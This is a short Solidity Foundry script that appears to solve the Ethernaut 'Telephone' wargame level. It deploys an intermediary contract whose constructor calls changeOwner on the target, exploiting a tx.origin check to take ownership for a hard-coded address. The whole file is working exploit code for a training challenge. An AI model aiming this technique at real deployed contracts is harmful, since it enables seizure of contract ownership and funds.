// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Telephone} from "../src/ethernaut4.sol";
import {console} from "lib/forge-std/src/console.sol";

contract A is Script{
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new B();
        vm.stopBroadcast();
    }
}
contract B {
    Telephone instance = Telephone(0x6EbA416D3f8B7502788aB205Cf36588fE5a2Da36);
    constructor(){
        console.log(instance.owner());
        instance.changeOwner(0xbf2B63cCeE4d24F63c138b6a9b82ef14f6793779);
        console.log(instance.owner());
    }
}